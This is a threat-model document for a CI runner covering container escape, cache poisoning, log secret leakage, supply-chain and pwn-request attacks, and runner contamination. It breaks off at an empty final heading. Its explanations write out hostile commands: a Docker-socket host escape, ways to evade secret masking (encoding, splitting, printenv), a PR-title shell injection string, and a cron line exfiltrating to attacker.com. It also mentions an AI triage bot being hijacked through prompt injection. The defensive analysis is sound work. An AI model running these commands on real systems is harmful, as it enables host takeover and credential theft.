# The Ten Hardest Problems in Building a Trustworthy CI Runner

> Greenfield threat model for OpenForge CI runner.
> Each section: failure mode → why it is hard → real-world precedent → current best-practice defense → citations.
> Written 2026-11-04. All URLs verified accessible at time of writing.

---

## 1. Sandbox Escape from a Privileged or Misconfigured Docker Container

**Problem description.**
A CI runner that executes untrusted build jobs inside a Docker container is one `runc` bug away from full host root. The container runtime is the isolation boundary; when it is broken, everything inside the container — source code, secrets, network access — becomes host-level. This is hard because the attack surface is not in the user's code at all: it is in the OCI runtime, the kernel namespace implementation, or the Docker daemon itself, all of which are shared across thousands of jobs per host. Naive defenses like "we run as non-root" or "we use seccomp" fail because the bugs have been found in `WORKDIR` handling, file-descriptor leaks, cgroup `release_agent`, and `/proc/self/exe` — none of which are caught by capability checks. The container is the security boundary and the boundary is not a wall; it is a set of assumptions the kernel makes about file descriptor lifetimes and namespace isolation, and those assumptions have been violated repeatedly.

The fundamental problem is that the container runtime is a complex system that manages namespace transitions, file descriptor lifetimes, cgroup configuration, and seccomp filter installation — all in a race condition with the container's init process. The runc source code is approximately 30,000 lines of Go, and the namespace transition logic alone has been the site of at least three separate CVEs in the past five years. The attack surface is not the user's code; it is the runtime's internal state machine, which is not designed with the assumption that the container's init process is adversarial.

The Docker socket mount is a separate but related problem. The Docker daemon (`dockerd`) runs as root and exposes a control socket at `/var/run/docker.sock`. Any process that can write to that socket can ask the daemon to start a new container with `--privileged` and `-v /:/host`, giving it root on the host. This is not a bug — it is the intended behavior of the socket. But it means that any container that is given access to the Docker socket (for Docker-in-Docker, for observability agents, for CI pipelines that build images) is effectively given root on the host. The only defense is to not mount the socket, which means finding an alternative to Docker-in-Docker (rootless Docker, BuildKit in a separate container, or a microVM boundary that does not require the Docker socket at all).

**Real-world examples.**
- **CVE-2019-5736** (CVSS 8.6): A malicious container could overwrite the host `runc` binary via `/proc/self/exe` using an `O_PATH` file descriptor opened during `runc exec`. Fixed in runc 1.0-rc8 / Docker 18.09.2. The runc maintainers published exploit code publicly. The Kubernetes blog post is the canonical reference.
- **CVE-2024-21626** (CVSS 8.6, "Leaky Vessels" part 1): A file-descriptor leak in runc ≤ 1.1.11 allowed `WORKDIR` to reference a host directory via `/proc/self/fd/`, giving the container process a working directory on the host filesystem. Exploitable via a malicious Dockerfile (`WORKDIR /proc/self/fd/7`) or `runc exec`. Fixed in runc 1.1.12.
- **CVE-2024-23651 / CVE-2024-23652 / CVE-2024-23653** ("Leaky Vessels" parts 2–4): Race conditions and arbitrary file deletion in BuildKit during `docker build`. A malicious `FROM` image was sufficient; no `docker exec` required.
- **Docker socket mount** (no CVE — documented behavior): A container with `/var/run/docker.sock` mounted can run `docker run -v /:/host --privileged alpine chroot /host sh` and become root on the host. This is not a bug; it is the intended behavior of the socket, and it appears in CI pipelines that do Docker-in-Docker.

**Current best-practice defense.**
- Run all container runtimes at the latest patched version; subscribe to runc and containerd security mailing lists.
- Never mount `/var/run/docker.sock` into untrusted job containers. Use rootless Docker or a gVisor/Kata containers microVM boundary for hostile code.
- Run containers as non-root (`runAsNonRoot: true` in K8s PodSecurityContext or `USER` in Dockerfile).
- Apply a restrictive seccomp profile and drop all unnecessary Linux capabilities (`--cap-drop=ALL`, re-add only what the job needs).
- Use an immutable host filesystem (read-only `/`) so that even a successful `runc` binary overwrite fails.
- For OpenForge: use a gVisor or Firecracker microVM boundary for untrusted jobs, not plain runc. The runc CVE history shows that a plain container boundary is not sufficient for untrusted code.

**Threat model implications.**
This is the highest-priority threat in the runner threat model. A successful sandbox escape compromises the entire host, including all other jobs running on it, all secrets stored in the runner's environment, and the network path to internal services. The blast radius is not one job; it is the entire runner pool. The threat model must assume that the container runtime will have future vulnerabilities, and the defense must be layered: even if runc is patched, a kernel vulnerability or a Docker daemon misconfiguration can still break out. The microVM boundary (Firecracker, gVisor, Kata) is the only defense that does not rely on the correctness of the container runtime's namespace isolation.

**Citations.**
- NVD CVE-2019-5736: https://nvd.nist.gov/vuln/detail/cve-2019-5736
- Kubernetes blog (canonical reference): https://kubernetes.io/blog/2019/02/11/runc-and-cve-2019-5736/
- CERT-EU advisory 2019-003: https://cert.europa.eu/publications/security-advisories/2019-003/
- oss-security disclosure (runc maintainer): https://www.openwall.com/lists/oss-security/2019/02/11/2
- Snyk Labs "Leaky Vessels" overview: https://labs.snyk.io/resources/leaky-vessels-docker-runc-container-breakout-vulnerabilities/
- Snyk Labs CVE-2024-21626 deep dive: https://labs.snyk.io/resources/cve-2024-21626-runc-process-cwd-container-breakout/
- Snyk Labs Leaky Vessels deep dive (all 4 CVEs): https://labs.snyk.io/resources/leaky-vessels-container-vuln-deep-dive/
- GitHub Advisory GHSA-xr7r-f8xq-vfvv: https://github.com/advisories/GHSA-xr7r-f8xq-vfvv
- CERT-EU advisory 2024-016: https://cert.europa.eu/publications/security-advisories/2024-016/
- Docker container escape techniques (docker socket, privileged): https://maxuru.com/docker/container-escape/
- Yunolay container escape guide (CVE-2022-0492 cgroups v1): https://yunolay.com/container-escape/

---

## 2. Cache Poisoning Across Users and Runs

**Problem description.**
A build cache is a key-value store where the key is computed client-side (usually a hash of a lockfile) and the value is an archive of dependency files. The cache service does not validate that the bytes stored under a key actually came from the declared path or that the key was computed by an authorized workflow. This means any workflow that can write to the cache can plant malicious content that a later, higher-privileged workflow will restore and execute. This is hard to defend against because the cache is a performance feature that predates the security model; the key derivation is trusted to be correct, and the write permission is not scoped by trust level in most CI systems. Naive defenses like "we only cache from the main branch" fail because a `pull_request_target` workflow running in the base repository context can write to the same cache scope, and a compromised dependency can write from any branch. The TanStack incident (May 2026) demonstrated the full chain: untrusted PR → poisoned pnpm store → release pipeline restores cache → 84 malicious npm package versions published across 42 packages in six minutes.

The fundamental design flaw is that the cache key is computed client-side and trusted server-side. The key is usually a hash of the lockfile (e.g., `npm-${{ hashFiles('**/package-lock.json') }}`), which means that any workflow that has access to the same lockfile will compute the same key. If workflow A (untrusted, running in a fork PR context) and workflow B (trusted, running in the release pipeline) both use the same lockfile, they will compute the same cache key, and workflow A's poisoned entry will be restored by workflow B. The cache service has no way to know which workflow wrote the entry, what trust level the workflow had, or whether the entry should be visible to workflow B.

The `restore-keys` feature makes the problem worse. When an exact key miss occurs, `actions/cache` falls back to `restore-keys`, a list of prefixes. A broad prefix like `npm-` means an attacker does not need to predict the exact lockfile hash — they can pre-seed an entry such as `npm-pwned`, and on any run where the exact key misses, that entry is restored by prefix fallback. This converts an exact-match problem into a prefix-collision problem, which is far easier to win.

The GitHub Actions cache eviction policy change in November 2025 made the problem easier to exploit, not harder. The new policy evicts cache entries immediately when the repository cache exceeds 10 GB (previously it ran every 24 hours). An attacker who can write to the cache can now fill it with >10 GB of junk data to force immediate eviction of legitimate entries, then write a poisoned entry under the same key — all within a single workflow run. The Cacheract tool (Adnan Khan) automates this.

**Real-world examples.**
- **TanStack incident (May 11, 2026)**: A GitHub user opened PR #7378 against TanStack Router from a fork. The PR triggered a `pull_request_target` workflow that checked out the attacker's code and ran it in the base repository's context. Each push wrote a poisoned pnpm store to the shared GitHub Actions cache. The release pipeline later restored that cache and executed the payload with `contents: write` and `id-token: write` permissions. The attacker exfiltrated a GitHub OAuth token and published 84 malicious versions across 42 `@tanstack/*` npm packages.
- **Cline supply chain attack (February 2026)**: A Claude issue-triage bot with prompt injection was used to achieve code execution in a default-branch workflow. The attacker then used Cacheract (an open-source cache poisoning tool by Adnan Khan) to flood the GitHub Actions cache with >10 GB of junk data, triggering GitHub's LRU eviction policy. Legitimate cache entries were purged and replaced with poisoned `node_modules` entries. The nightly release workflow restored the poisoned cache and exfiltrated `VSCE_PAT`, `OVSX_PAT`, and `NPM_RELEASE_TOKEN`, resulting in 4,000 developers having `OpenClaw` installed via the Cline CLI.
- **Adnan Khan's "Actions Cache Blasting" (May 2024)**: Formally introduced GitHub Actions cache poisoning as a vulnerability class. Demonstrated that the Actions Runtime Token remains valid for 6 hours after job completion, allowing cache writes well after the job that leaked the token has finished.

**Current best-practice defense.**
- GitHub introduced `cache-mode` in 2026: `pull_request_target` workflows get `read`-only cache access by default. `push` workflows get `write` access. Job-level settings override workflow-level, and the setting carries through reusable workflows.
- Use short-lived, workflow-specific cache keys that include the commit SHA and the workflow identity.
- Validate restored cache contents before use (checksum verification against a known-good baseline).
- Sign cache entries cryptographically and verify the signature before use.
- For OpenForge: implement cache write permission as an explicit, per-workflow trust-level setting. Untrusted code (fork PRs, third-party actions) must never have cache write access. The cache key must include the trust boundary identifier so that a cache written by an untrusted workflow cannot be read by a trusted one.

**Threat model implications.**
Cache poisoning is a lateral movement vector: it converts a low-privilege code execution (in a fork PR or a compromised dependency) into a high-privilege code execution (in a release pipeline with publish secrets). The threat model must treat the cache as an inter-workflow communication channel, not as a performance optimization. Any workflow that can write to the cache is effectively able to inject code into any future workflow that reads from it. The cache key space must be partitioned by trust level, and the cache service must enforce the partition server-side, not rely on client-side key derivation.

**Citations.**
- Adnan Khan "The Monsters in Your Build Cache": https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/
- Adnan Khan "Turning Almost Nothing into a Supply Chain Compromise of Angular": https://adnanthekhan.com/posts/angular-compromise-through-dev-infra/
- SafeDep "Cache Poisoning Through pull_request_target: The TanStack Incident": https://safedep.io/blog/tanstack-github-actions-cache-poisoning
- Socket.dev "GitHub Actions Adds cache-mode to Limit Cache Poisoning Risk": https://www.socket.dev/blog/github-actions-cache-mode
- CodeQL query: "Cache Poisoning via caching of untrusted files": https://codeql.github.com/codeql-query-help/actions/actions-cache-poisoning-direct-cache/
- Mohammad Khan "A GitHub Issue Title Compromised 4,000 Developer Machines" (Cline): https://mohammadkhan.dev/blog/clinejection-github-issue-supply-chain
- pipebreach.com "Keys Are Pointers Too: GitHub Actions Cache Poisoning": https://pipebreach.com/posts/cache-poisoning-ci-cd-/
- neciudan.dev GitHub Actions poisoning overview: https://neciudan.dev/github-actions-poisoning

---

## 3. Secret Leakage via Build Logs

**Problem description.**
CI build logs are often publicly accessible in public repositories, and even in private repositories they are accessible to anyone with repository read access. Secrets that are echoed to stdout — whether by an accidental `echo $SECRET`, a panic dump, a debug flag, a tool that echoes its input, or a compromised action that dumps process memory — end up in the log and become readable. This is hard to defend against because the exfiltration channel is the log itself, which is an intended output of the build system, not an anomaly. Naive defenses like "GitHub Actions masks secrets" fail because masking only hides the exact string value; a transformed secret (base64, URL-encoded, split into substrings, hex-encoded) bypasses the mask. The tj-actions/changed-files incident showed that an attacker can dump the entire Runner.Worker process memory, extract every secret, double-base64-encode it, and print it to the log — all within a single Python script embedded in a compromised action. The Azure CLI incident showed that even legitimate tooling can echo credentials to logs when used in certain configurations (e.g., a `delete` command in Pipeline B echoes the secret created by Pipeline A, and Pipeline B never registered that value as a secret, so it is not masked).

The specific exfiltration techniques that bypass secret masking are well-documented:

1. **Double encoding.** `echo "$SECRET" | base64 | base64` produces a string that the masker does not recognize as the original secret. The attacker decodes it twice on their end.

2. **Splitting.** `echo ${SECRET:0:4}; echo ${SECRET:4:200}` prints the secret in two parts. The masker sees two short strings, neither of which matches the full secret.

3. **Hex encoding.** `echo $SECRET | xxd -p` produces a hex string that is not recognized by the masker.

4. **Environment dump.** `printenv` or `env | sort` prints all environment variables, including all secrets, to the log. The masker only redacts registered secret values, but `printenv` output includes the variable names and values in a format that the masker may not match.

5. **Process memory dump.** A Python script that reads `/proc/<pid>/mem` for the Runner.Worker process can extract all secrets in memory, including secrets that were never printed to stdout. This is the technique used in the tj-actions incident.

6. **File reading.** Secrets passed to shell actions are stored in `.sh` files in `/home/runner/work/_temp`. A subsequent step that reads these files can extract the secrets even if they were never printed to stdout.

**Real-world examples.**
- **tj-actions/changed-files compromise (March 14–15, 2025, CVE-2025-30066)**: The compromised action executed a Python script that dumped CI/CD runner process memory, extracted all secrets matching the pattern `"value":"...","isSecret":true`, double-base64-encoded them, and printed the result to the workflow log. GitGuardian's forensic analysis found 603 secrets exposed across 237 repositories, including DockerHub credentials, AWS keys, GitHub PATs, Jira tokens, and cloud.gov credentials. The logs were publicly accessible in public repositories until deleted.
- **Microsoft Azure CLI credentials leaked to GitHub Actions logs (November 2023)**: Palo Alto Networks Prisma Cloud researchers discovered that Azure CLI commands echo sensitive data (including service principal credentials) to stdout. When run in a GitHub Actions workflow, this output appears in the build log. Microsoft MSRC issued guidance; Azure CLI 2.54 added output suppression. The root cause was that the Azure CLI's `az` commands echo resource details as part of their normal operation, and a sibling pipeline that deletes a resource echoes the secret created by another pipeline without that secret being registered for masking.
- **Karim Rahal "Leaking Secrets From GitHub Actions" (January 2023)**: Systematic demonstration that (a) secrets passed to JS actions are stored in `.sh` files in `/home/runner/work/_temp` and readable by any subsequent step, (b) environment variables for JS actions are readable, and (c) dumping Runner.Listener process memory reveals all referenced secrets plus a write-access GitHub token.

**Current best-practice defense.**
- Treat the build log as an untrusted output channel. Never assume that a secret registered in the CI system's secret store will not appear in the log.
- Apply output filtering at the log ingestion layer, not just at the secret-redaction layer. Scan for high-entropy strings, known credential patterns (AWS `AKIA...`, GitHub `ghp_...`, `gho_...`, `ghs_...`, JWT `eyJ...`), and base64-encoded blocks of >60 characters.
- Use short-lived, per-job credentials (OIDC tokens, ephemeral JWTs) so that even if a credential is leaked to a log, its lifetime is minutes, not years.
- For OpenForge: implement a log sanitization pipeline that runs before logs are stored or made accessible. The sanitizer must be independent of the workflow's trust level — even a workflow that has full secret access cannot bypass the sanitizer. Additionally, store logs in an append-only, access-controlled store with a 72-hour default retention for untrusted workflows.

**Threat model implications.**
The build log is an exfiltration channel that the attacker does not need to open — it is already open by design. The threat model must assume that any data that reaches stdout is potentially exfiltrated. This means: (a) secrets must never be injected as environment variables that are visible to untrusted steps, (b) tools that echo their input (CLI tools, debug flags, panic dumps) must be run in a sanitized environment where the log output is filtered, and (c) the log store must be access-controlled so that even if a secret leaks to the log, the attacker cannot read the log. The log is not a security boundary; it is a data channel that the attacker can use if they have code execution.

**Citations.**
- StepSecurity "Harden-Runner detection: tj-actions/changed-files action is compromised": https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised
- CISA alert (CVE-2025-30066 + CVE-2025-30154): https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction
- GitHub Advisory GHSA-mw4p-6x4p-x5m5: https://github.com/tj-actions/changed-files/security/advisories/GHSA-mw4p-6x4p-x5m5
- GitGuardian "Compromised tj-actions/changed-files GitHub Action: A look at publicly leaked secrets": https://blog.gitguardian.com/compromised-tj-actions/
- Unit 42 "GitHub Actions Supply Chain Attack: A Targeted Attack on Coinbase Expanded to the Widespread tj-actions/changed-files Incident": https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/
- Microsoft MSRC "Microsoft guidance regarding credentials leaked to GitHub Actions Logs through Azure CLI": https://www.microsoft.com/en-us/msrc/blog/2023/11/microsoft-guidance-regarding-credentials-leaked-to-github-actions-logs-through-azure-cli
- Palo Alto Networks "All the Small Things: Azure CLI Leakage and Problematic Usage Patterns": https://www.paloaltonetworks.com/blog/cloud-security/secrets-leakage-user-error-azure-cli/
- Karim Rahal "Leaking Secrets From GitHub Actions: Reading Files And Environment Variables, Intercepting Network/Process Communication, Dumping Memory": https://www.karimrahal.com/2023/01/05/github-actions-leaking-secrets/
- GitHub docs "Compromised runners": https://docs.github.com/en/actions/concepts/security/compromised-runners
- GitHub Forensics "GitHub Actions secrets leak: investigating exfiltration": https://www.githubforensics.com/en/blog/github-actions-secrets-leak
- 100 Days of Red Team "Exfiltrating secrets via public CI logs (working technique)": https://www.100daysofredteam.com/p/exfiltrating-secrets-via-public-ci-logs

---

## 4. Supply Chain Attack via Action/Plugin Marketplace

**Problem description.**
A CI action or plugin is third-party code that runs in the context of your build, with access to your secrets, your source, and your network. The marketplace model means you are trusting the maintainer's GitHub account, their CI/CD pipeline, their dependency graph, and their tag management. An attacker who compromises any of those — the maintainer's PAT, a dependency used in the action's build, a CI workflow in the action's repository — can push malicious code to a version tag that thousands of downstream workflows reference. This is hard to defend against because the compromise does not introduce a new vulnerability; it uses the existing trust relationship. The action is doing exactly what it was told to do; the problem is that "what it was told to do" has changed. Naive defenses like "pin to a commit SHA" fail if the attacker retroactively modifies the commit (which is what happened in the tj-actions incident — the attacker pushed a new commit and re-pointed multiple version tags to it). The Trivy incident (March 2026) showed that even a well-known security tool with a strong reputation can be compromised through stolen publishing credentials, and that the compromise went undetected because a vulnerability scanner examining the image would have no reason to flag it — the attack was in the publishing process, not the dependency graph.

The attack chain in the tj-actions incident illustrates the depth of the problem:

1. The attacker compromised `reviewdog/action-setup` (a dependency of `tj-actions/eslint-changed-files`).
2. `tj-actions/eslint-changed-files` was a composite action that ran `reviewdog/action-setup` at runtime.
3. When `tj-actions/changed-files` ran a workflow that used `tj-actions/eslint-changed-files`, the compromised `reviewdog/action-setup` executed, giving the attacker code execution in the context of the `tj-actions/changed-files` repository.
4. The attacker used this code execution to steal the PAT belonging to the `@tj-actions-bot` account.
5. With the stolen PAT, the attacker pushed a malicious commit to the `tj-actions/changed-files` repository and re-pointed multiple version tags to it.
6. Every downstream workflow that referenced any of the affected version tags executed the malicious code.

This is a four-hop supply chain attack: reviewdog/action-setup → tj-actions/eslint-changed-files → tj-actions/changed-files → 23,000+ downstream repositories. Each hop uses a legitimate trust relationship, and each hop is individually difficult to detect. The defense requires trust verification at every hop: the action registry must verify the provenance of each action, including its dependencies, and the runner must refuse to execute an action whose provenance cannot be verified.

**Real-world examples.**
- **tj-actions/changed-files (March 2025, CVE-2025-30066)**: The attacker compromised a PAT linked to the `@tj-actions-bot` account. They created a malicious commit outside the repository, pushed it disguised as `renovate[bot]`, and had it auto-merged. They then retroactively updated multiple version tags (`v1.0.0` through `v45.0.7`) to point to the malicious commit `0e58ed8`. The compromised action dumped runner memory and printed secrets to logs. Over 23,000 repositories were affected. The attack chain was: reviewdog/action-setup compromise → tj-actions/eslint-changed-files (dependency) → tj-actions/changed-files (PAT theft) → downstream workflows.
- **Trivy supply chain compromise (March 19–23, 2026)**: Aqua Security's Trivy vulnerability scanner was compromised via stolen Docker Hub publishing credentials. The `0.69.4`, `0.69.5`, `0.69.6`, and `latest` tags on Docker Hub were silently re-pointed to malicious images. Docker Hub customers who pulled those tags had their CI/CD secrets, cloud credentials, SSH keys, and Docker configurations compromised. Docker and Aqua Security removed the images on March 23.
- **Checkmarx KICS compromise (April 22, 2026)**: A threat actor authenticated to Docker Hub using valid Checkmarx publisher credentials and pushed malicious images to the `checkmarx/kics` repository. Five existing tags were overwritten and two new tags were created. The images were built from an attacker-controlled source repository.

**Current best-practice defense.**
- Pin all third-party actions and images to immutable commit SHAs or content-addressable digests (`@sha256:...`), not version tags.
- Require signed provenance attestations (SLSA Level 3, Sigstore) for any action or image that runs with elevated permissions.
- Implement a private action registry that mirrors and verifies upstream actions before they are available to workflows.
- Monitor for tag re-pointing events in upstream action repositories; alert when a version tag changes to reference a different commit SHA.
- For OpenForge: implement a signed action registry. Actions must be signed by a trusted key before they can be executed. The runner must verify the signature at execution time, not at pull time. Additionally, implement a canary deployment model where new action versions are run in an isolated environment before being promoted to the general pool.

**Threat model implications.**
The action marketplace is a supply chain that the CI system does not control. The threat model must treat every third-party action as potentially compromised at any time. The defense is not "trust the action" — it is "verify the action's provenance at execution time and limit the blast radius if it is compromised." This means: (a) actions run in the same sandbox as untrusted user code, (b) actions cannot access secrets that are not explicitly declared in the workflow, and (c) the signed action registry provides a tamper-evident record of which action version was executed, enabling forensic analysis after an incident.

**Citations.**
- StepSecurity incident report: https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised
- CISA alert: https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction
- GitHub Advisory: https://github.com/tj-actions/changed-files/security/advisories/GHSA-mw4p-6x4p-x5m5
- Unit 42 threat assessment: https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/
- GitHub Issue #2463: https://github.com/tj-actions/changed-files/issues/2463
- Docker blog "Trivy supply chain compromise: What Docker Hub users should know": https://www.docker.com/blog/trivy-supply-chain-compromise-what-docker-hub-users-should-know/
- Docker blog "Trivy, KICS, and the shape of supply chain attacks so far in 2026": https://www.docker.com/blog/trivy-kics-and-the-shape-of-supply-chain-attacks-so-far-in-2026/

---

## 5. Fork PR Trust Boundary — the `pull_request_target` "Pwn Request"

**Problem description.**
The `pull_request_target` event runs a workflow in the context of the base repository with access to repository secrets and a write-capable `GITHUB_TOKEN`. This is necessary for legitimate use cases (posting PR comments, triggering labeler workflows), but it becomes catastrophic when the workflow checks out and executes code from the fork. The pattern is called a "pwn request": an attacker opens a PR from a fork containing a malicious `Makefile`, `package.json` postinstall script, or build configuration; the `pull_request_target` workflow checks out the fork's code and runs `make test` or `npm install`, executing the attacker's code with the base repository's secrets. This is hard to defend against because the workflow file itself comes from the trusted default branch — only the checked-out code is untrusted. GitHub's own documentation explicitly warns against this pattern, yet it appears in thousands of public repositories. The vulnerability is not in GitHub's code; it is in the workflow author's assumption that `pull_request_target` is safe because "the workflow file is from the default branch." The checked-out code is the attack surface, not the workflow file. Even after GitHub added the `allow-unsafe-pr-checkout` flag in 2026, script injection through `${{ }}` interpolation in `pull_request_target` workflows remains a vulnerability class that no checkout protection can catch.

The reason this pattern persists is that it solves a real problem. A `pull_request` workflow from a fork cannot access repository secrets, so it cannot post authenticated PR comments, trigger dependent builds, or access private registries. The `pull_request_target` event was introduced specifically to solve this: it runs in the base repository context with full secret access, but checks out the base repository's code (not the fork's code) by default. The trap is that the default checkout behavior is what makes it safe — the moment a workflow author overrides the default to check out the fork's code (to "run the PR's tests"), they have introduced a pwn request. The workflow author is not being careless; they are following the natural intuition that "I want to test the code the PR is proposing." The security model requires them to know that this intuition is wrong, and to restructure the workflow to separate the untrusted code execution from the trusted secret access — a pattern that is non-obvious and error-prone.

The script injection variant makes the problem worse. Even if the workflow never checks out the fork's code, any `${{ }}` expression that interpolates PR event data (title, body, branch name, commit message) into a shell command is a code injection vector. The attacker controls the PR title; the workflow interpolates the title into a shell command; the shell executes the attacker's command. This variant does not require a checkout step at all, and it is not caught by checkout-based static analysis. The only defense is to never interpolate untrusted event data into shell commands, which requires either a workflow linting rule or a workflow engine that treats event data as data, not as code.

**Real-world examples.**
- **GitHub Security Lab "Preventing pwn requests" (August 2021)**: The canonical reference. Jarl Obuchow's research formally described the `pull_request_target` + untrusted checkout pattern and demonstrated that a malicious PR can exfiltrate all repository secrets. This is the document that established the term "pwn request" in the CI security community.
- **GHSL-2024-030: dotnet/docfx (July 2024)**: GitHub Security Lab advisory for a pwn request vulnerability in the `dotnet/docfx` repository. The `ci.yml` workflow used `pull_request_target` with an explicit checkout of the PR head. An attacker could create a PR with a malicious `templates/packages.json` file that would execute arbitrary commands in the runner, gaining access to `secrets.PERCY_TOKEN`.
- **Wiz "GitHub Actions Security: Auditing pull_request_target" (October 2026)**: Demonstrated that pwn request vulnerabilities do not require a checkout step. Script injection through `${{ github.event.pull_request.title }}` interpolation in a `pull_request_target` workflow is sufficient: an attacker crafts a PR title containing `"; touch /tmp/pwned; echo INJECTED #` and achieves code execution with the job's secrets and token. None of GitHub's 2026 changes touch this vector.
- **TanStack incident (May 2026)**: The pwn request was the initial entry point. The attacker opened PR #7378 from a fork, which triggered a `pull_request_target` workflow that checked out the attacker's code. The pwn request provided the code execution that enabled the cache poisoning escalation.

**Current best-practice defense.**
- Use `pull_request` instead of `pull_request_target` whenever possible. `pull_request` runs in the fork's context with a read-only token and no secrets.
- If `pull_request_target` is necessary (e.g., for posting authenticated PR comments), never check out and execute the fork's code. The checked-out code must be treated as data only.
- GitHub's `allow-unsafe-pr-checkout: true` flag (2026) must be used with explicit code review approval and is intentionally named to be easy to spot in static analysis.
- Use CodeQL for GitHub Actions to detect pwn request patterns automatically.
- For OpenForge: the workflow engine must enforce a hard separation between "code from the base repository" and "code from the PR head." A `pull_request_target`-equivalent event must never be able to execute code that originates from the fork. The workflow engine should refuse to run any step that references the PR head's files in a `run:` or `build:` context. Additionally, implement a static analysis pass that flags any `${{ }}` interpolation of PR event data in shell command contexts.

**Threat model implications.**
The fork PR trust boundary is the single most common misconfiguration in CI systems and the most frequently exploited. The threat model must treat any workflow that runs in the base repository context as having full access to repository secrets, and any workflow that executes code from the fork as having zero trust. These two properties are in direct tension: a `pull_request_target` workflow needs both (base context for secrets, fork code for the PR content), and the combination is unsafe. The only safe resolution is to split the workflow: the untrusted part runs in the fork context with no secrets, and the trusted part runs in the base context without executing fork code. The workflow engine must enforce this split architecturally, not rely on the workflow author to do it correctly.

**Citations.**
- GitHub Security Lab "Preventing pwn requests" (canonical reference): https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/
- GitHub docs "Securely using pull_request_target": https://docs.github.com/en/actions/reference/security/securely-using-pull_request_target
- OWASP "GitHub Actions Security Cheat Sheet": https://cheatsheetseries.owasp.org/cheatsheets/GitHub_Actions_Security_Cheat_Sheet.html
- Endor Labs "PWN Request Threat: A Hidden Danger in GitHub Actions": https://www.endorlabs.com/learn/pwn-request-threat-a-hidden-danger-in-github-actions
- Wiz "GitHub Actions Security: Auditing pull_request_target" (script injection vector): https://www.wiz.io/blog/github-actions-security-pwn-request-reckoning
- GitHub Security Lab GHSL-2024-030 (docfx pwn request): https://securitylab.github.com/advisories/GHSL-2024-030_dotnet_docfx/
- Stéphane Robert "Securing pull_request_target": https://www.stephane-robert.info/en/docs/github-actions/security/pull-request-target/
- Cloud Security Alliance research note (CSA-2026 PRt scan): https://labs.cloudsecurityalliance.org/research/csa-research-note-github-actions-prt-scan-supply-chain-2026/

---

## 6. Runner Reuse and State Contamination Between Jobs

**Problem description.**
A long-lived CI runner carries mutable state from one job to the next: installed binaries, dependency caches, environment variables, credential files in home directories, git configuration, temporary files, and orphaned background processes. Any of these can be a vector for cross-job contamination: a job that installs a malicious binary on `PATH` affects every subsequent job on the same runner; a job that writes `~/.docker/config.json` leaves Docker credentials readable by the next job; a job that exports a token to an environment variable leaves it in the shell history or in a process that outlives the job. This is hard to defend against because the contamination is not a bug in the runner — it is the natural consequence of reusing a machine. The cleanup step is the defense, and cleanup steps are forgotten, incomplete, or bypassed by jobs that write to unexpected locations (`.git/hooks`, `~/.ssh/authorized_keys`, `/etc/cron.d`). Naive defenses like "we wipe the workspace directory" fail because credentials in `~/.aws/credentials`, `~/.docker/config.json`, `~/.config/gcloud/`, and `~/.ssh/` are outside the workspace. The GitLab runner security documentation is explicit: "Any user that has the Developer role for the project's repository could compromise the security of the environment hosting the runner, whether intentional or not. This risk is even more acute if your self-managed runners are non-ephemeral and used for multiple projects."

The specific contamination vectors are well-documented:

1. **PATH modification.** A job that adds a directory to `PATH` (e.g., `export PATH=$PWD/bin:$PATH`) leaves the modified `PATH` in the shell environment. If the shell environment is inherited by the next job (which it is, in a persistent runner), the next job's `git`, `npm`, `docker`, or any other command may resolve to the attacker's binary instead of the legitimate one.

2. **Credential file persistence.** A job that runs `docker login`, `aws configure`, or `gcloud auth login` writes credential files to the runner's home directory (`~/.docker/config.json`, `~/.aws/credentials`, `~/.config/gcloud/`). These files persist on the runner's filesystem and are readable by every subsequent job on the same runner, regardless of trust level.

3. **Git hooks.** A job that creates a git hook in `.git/hooks/` (e.g., a `post-checkout` hook that exfiltrates environment variables) leaves the hook in place. The next job that runs `git checkout` or `git pull` in the same workspace will trigger the hook, executing the attacker's code.

4. **Cron jobs.** A job that adds a cron entry (`echo '*/5 * * * * curl http://attacker.com/exfil' >> /etc/cron.d/exfil`) leaves the cron entry in place. The cron daemon will execute the entry every five minutes, independent of any job.

5. **Background processes.** A job that starts a background process (e.g., a reverse shell, a crypto miner, or a DNS tunneling daemon) leaves the process running after the job completes. The process outlives the job and continues to operate on the runner.

6. **Local package manager state.** A job that installs a malicious package into the local npm cache (`~/.npm`), pip cache (`~/.cache/pip`), or cargo registry (`~/.cargo/registry`) leaves the malicious package in the cache. The next job that installs the same package will get the malicious version from the cache instead of from the registry.

**Real-world examples.**
- **GitLab runner security documentation**: Documents the risk model explicitly: non-ephemeral runners used for multiple projects mean "a job from a repository embedded with malicious code can compromise the security of other repositories serviced by the non-ephemeral runner." The documentation recommends ephemeral runners for privileged workloads.
- **Barret Blake "Your PC Is a Build Agent: Part 2" (September 2026)**: First-person account of the operational and security problems with a long-lived self-hosted runner. The author documents how a modified binary on `PATH`, a poisoned `node_modules` package in the npm cache, a git hook in the workspace, or a background process that outlives its job can all be vectors of attack. The `.runner` registration file persists on a named volume, and an ephemeral runner that does not clean up the previous registration silently fails — the runner starts, looks healthy, but no job ever comes because the registration token was deleted 20 minutes ago.
- **Safeguard "What hidden state does a long-lived CI agent hold?" (October 2026)**: Documents the five categories of hidden state: installed tools, dependency caches, stored credentials, workspace leftovers, and local logs. Notes that GitLab's runner security guidance warns against running `docker login` as the runner user because "every credential kept in the runner host's configuration files is available to every job the runner executes."

**Current best-practice defense.**
- Use ephemeral runners for all untrusted code. Each job gets a freshly provisioned instance that is destroyed after the job completes.
- If persistent runners are required (for GPU access, large local caches, or specific network topology), implement a strict cleanup protocol that removes all five categories of hidden state between jobs.
- Never store long-lived credentials on the runner. Inject per-job credentials (OIDC tokens, ephemeral JWTs) that expire when the job ends.
- For OpenForge: default to ephemeral runners. Persistent runners must be an explicit opt-in with a security review. The runner controller must verify that no process from a previous job is running before starting a new job. The filesystem must be wiped (or the runner must be destroyed and recreated) between jobs.

**Threat model implications.**
